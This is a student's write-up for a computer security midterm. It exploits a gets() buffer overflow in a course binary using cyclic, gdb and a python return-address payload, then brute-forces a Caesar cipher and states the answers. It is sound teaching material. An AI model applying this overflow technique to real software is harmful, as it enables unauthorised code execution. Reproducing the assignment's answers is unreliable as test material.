# Midterm

## Problem 1
Problem 1 is that we get a binary file and we need to exploit the binary to get some secret key.

### Solution
Solved on Fedora 36 with kernel 5.19.7-200.fc36.x86_64 and gcc 12.2.1 20220819 (Red Hat 12.2.1-1).

Since we are supposed to know nothing about the binary file. We can use ```strings assignment``` and we can check if there are any unsafe functions in use, and we can also check if there are any interesting strings in the binary file.
As a matter of fact we can see that we are using ```gets``` to get input from the user, that function can be exploited. Small sidenote we can see the encoded string also.

Now we need to find out how big the buffer is that ```gets``` is using, to do that we can use the helpful command called ```cyclic``` this command creates a string that is a uniqe pattern at every space. We can try with 500 characters and then we check what the RBP is. For example if we use ```cyclic -n 4 500``` and input that into the binary file and we check the base pointer and we can see its ```0x63616170``` (we only take the first 4 bytes since n=4) and then we run ```cyclic -n 4 -l 0x63616170``` and we get ```260```.

Also to confirm that the buffer is something like 260 bytes we can check the stack with ```gdb``` and we can confirm that the bufferoverflow happens around 260 bytes since we can see that the stack is overflowing by using the command ```x/100x $rsp-200```.

After we overwrite the base pointer the next in line is the instruction pointer. So some trial and error might be needed. 

After some trial and error i have found out that we need 256 bytes to get to the base pointer and then 8 more to fully overwrite the base pointer, the next 8 bytes are the instruction pointer

Now we need to find the address of the print_secret_message function. We can do that by using ```gdb```
as shown below

```
(gdb) disass print_secret_message 
Dump of assembler code for function print_secret_message:
   0x000000000040123e <+0>:	push   %rbp
   0x000000000040123f <+1>:	mov    %rsp,%rbp
   0x0000000000401242 <+4>:	mov    0x2e0f(%rip),%rax        # 0x404058 <secret_message>
   0x0000000000401249 <+11>:	mov    %rax,%rdi
   0x000000000040124c <+14>:	call   0x401030 <puts@plt>
   0x0000000000401251 <+19>:	mov    $0x0,%edi
   0x0000000000401256 <+24>:	call   0x401080 <exit@plt>
End of assembler dump.
(gdb) quit
```
Here above we can see that the adress is ```0x000000000040123e```. Now we need to create a payload that fills the buffer and adds this address to the end of the payload. We can do that with the following python snippet
```
python3 -c "print('\x41'*256 + '\x42'*8 + '\x3e\x12\x40\x00\x00\x00\x00')" > payload 
```
Now if we try to run program within gdb with the payload we can see that we get the secret message.
```
(gdb) r < payload
Starting program: /home/star/SCHOOL/computer_security/midterm/assignment1 < payload
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib64/libthread_db.so.1".
Enter the secret passphrase that will decrypt the secret message: OLZLJYLATLZZHNLPZHNYLLHISLULZZLZ
[Inferior 1 (process 59339) exited normally]
(gdb) 
```
Running the program without gdb we can see that we get the same result.
```
./assignment1 < payload                                                        
Enter the secret passphrase that will decrypt the secret message: OLZLJYLATLZZHNLPZHNYLLHISLULZZLZ
```
The secret message is ```OLZLJYLATLZZHNLPZHNYLLHISLULZZLZ```

## Problem 2
Now that we have the secret message we need to decrypt it, All we know is that this is a ceaser cipher. Our decrypting program should be able to pick out the correct solutions from many. So essentialy it needs to be able to decrypt all ceasar cipers and then pick out the correct one.

### Solution
The script decrypt.py is a script that can decrypt ceasar ciphers, you might need to fidget with the constants for the scoring system. The script is not perfect but it can decrypt the secret message.
Just run the script with ```python3 decrypt.py``` and it will print out the decrypted message, that is ```HESECRETMESSAGEISAGREEABLENESSES``` and the key is 19 to the left.
